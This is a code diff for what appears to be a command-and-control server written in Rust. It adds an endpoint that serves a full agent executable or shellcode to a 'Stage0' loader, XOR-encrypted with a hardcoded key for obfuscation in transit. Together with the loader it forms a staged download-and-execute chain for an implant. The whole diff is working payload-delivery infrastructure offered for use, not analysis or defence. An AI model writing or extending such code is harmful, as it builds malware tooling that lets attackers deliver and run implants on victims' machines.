@@ -523,3 +523,78 @@ pub async fn server_status(State(state): State<Arc<ApiState>>) -> Json<ServerSta
         tls_enabled: true,
     })
 }
+
+/// XOR encryption key for agent download (same as in builder)
+const AGENT_XOR_KEY: &[u8] = b"C2R2_STAGE0_AGENT_KEY_2026";
+
+/// Download the full agent (XOR encrypted) for Stage0
+/// 
+/// Stage0 calls this endpoint to download the agent binary.
+/// The agent is XOR encrypted for basic obfuscation in transit.
+/// 
+/// Response format:
+/// - First 4 bytes: XOR key length (little-endian u32)
+/// - Next N bytes: XOR key
+/// - Next 4 bytes: agent size (little-endian u32)
+/// - Remaining: XOR encrypted agent bytes (EXE format for process execution)
+pub async fn download_stage0_agent() -> impl axum::response::IntoResponse {
+    use axum::http::{header, StatusCode};
+    use std::fs;
+    
+    // Stage0 now executes agent as a process, so we serve the EXE directly
+    // (not shellcode). Prioritize .exe over .bin
+    let agent_paths = [
+        "dist/agent.exe",      // EXE version (preferred for process execution)
+        "agent.exe",           // EXE in current dir
+        "../dist/agent.exe",   // EXE relative
+        "modules/agent.exe",   // EXE in modules
+        "dist/agent.bin",      // Fallback to shellcode
+        "agent.bin",
+    ];
+    
+    let agent_path = agent_paths.iter().find(|p| std::path::Path::new(p).exists());
+    
+    let agent_bytes = match agent_path {
+        Some(path) => match fs::read(path) {
+            Ok(bytes) => bytes,
+            Err(e) => {
+                tracing::error!("Error reading agent: {}", e);
+                return (
+                    StatusCode::INTERNAL_SERVER_ERROR,
+                    [(header::CONTENT_TYPE, "application/octet-stream")],
+                    format!("ERROR:Failed to read agent: {}", e).into_bytes(),
+                );
+            }
+        },
+        None => {
+            tracing::error!("Agent not found in any expected path");
+            return (
+                StatusCode::NOT_FOUND,
+                [(header::CONTENT_TYPE, "application/octet-stream")],
+                b"ERROR:Agent not found".to_vec(),
+            );
+        }
+    };
+    
+    tracing::info!("Serving agent ({} bytes, XOR encrypted)", agent_bytes.len());
+    
+    // XOR encrypt the agent
+    let encrypted: Vec<u8> = agent_bytes
+        .iter()
+        .enumerate()
+        .map(|(i, &byte)| byte ^ AGENT_XOR_KEY[i % AGENT_XOR_KEY.len()])
+        .collect();
+    
+    // Build response: key_len(4) + key + size(4) + encrypted_agent
+    let mut response = Vec::with_capacity(4 + AGENT_XOR_KEY.len() + 4 + encrypted.len());
+    response.extend_from_slice(&(AGENT_XOR_KEY.len() as u32).to_le_bytes());
+    response.extend_from_slice(AGENT_XOR_KEY);
+    response.extend_from_slice(&(encrypted.len() as u32).to_le_bytes());
+    response.extend_from_slice(&encrypted);
+    
+    (
+        StatusCode::OK,
+        [(header::CONTENT_TYPE, "application/octet-stream")],
+        response,
+    )
+}
